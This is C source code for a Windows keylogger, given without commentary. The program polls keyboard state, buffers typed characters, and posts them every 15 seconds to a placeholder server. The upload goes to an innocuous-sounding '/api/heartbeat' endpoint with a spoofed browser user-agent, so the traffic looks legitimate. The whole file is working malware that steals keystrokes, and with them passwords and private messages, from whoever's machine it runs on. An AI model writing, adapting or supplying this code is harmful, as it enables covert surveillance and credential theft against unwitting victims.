#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define SERVER "your.server.ip" // Use IP or plain domain (no https)
#define PORT 80
#define LOG_BUFFER_SIZE 1024

void exfiltrate_data(const char *data) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char message[4096], response[4096];

    // Prepare JSON payload
    char json_payload[LOG_BUFFER_SIZE + 64];
    snprintf(json_payload, sizeof(json_payload),
        "{\"status\":\"ok\",\"data\":\"%s\"}", data);

    // Compose HTTP POST with legitimate-looking headers and endpoint
    snprintf(message, sizeof(message),
        "POST /api/heartbeat HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/122.0.0.0 Safari/537.36\r\n"
        "Content-Type: application/json\r\n"
        "Accept: application/json\r\n"
        "Connection: keep-alive\r\n"
        "Content-Length: %d\r\n\r\n"
        "%s",
        SERVER, (int)strlen(json_payload), json_payload);

    WSAStartup(MAKEWORD(2,2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr(SERVER);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == 0) {
        send(s, message, (int)strlen(message), 0);
        recv(s, response, sizeof(response), 0);
    }
    closesocket(s);
    WSACleanup();
}

int main(void) {
    char log_buffer[LOG_BUFFER_SIZE] = {0};
    int log_index = 0;
    char key;
    DWORD last_exfil = GetTickCount();

    while (1) {
        for (key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                // Alphanumeric and some punctuation
                if ((key >= 39 && key <= 64) || (key >= 65 && key <= 90) || (key >= 97 && key <= 122)) {
                    log_buffer[log_index++] = key;
                } else if (key == VK_SPACE) {
                    log_buffer[log_index++] = ' ';
                } else if (key == VK_RETURN) {
                    log_buffer[log_index++] = '\n';
                }
                // If buffer is nearly full, exfiltrate
                if (log_index >= LOG_BUFFER_SIZE - 2) {
                    log_buffer[log_index] = '\0';
                    exfiltrate_data(log_buffer);
                    log_index = 0;
                    memset(log_buffer, 0, LOG_BUFFER_SIZE);
                    last_exfil = GetTickCount();
                }
            }
        }
        // Exfiltrate every 15 seconds even if buffer isn't full
        if (log_index > 0 && (GetTickCount() - last_exfil > 15000)) {
            log_buffer[log_index] = '\0';
            exfiltrate_data(log_buffer);
            log_index = 0;
            memset(log_buffer, 0, LOG_BUFFER_SIZE);
            last_exfil = GetTickCount();
        }
        Sleep(10);
    }
    return 0;
}
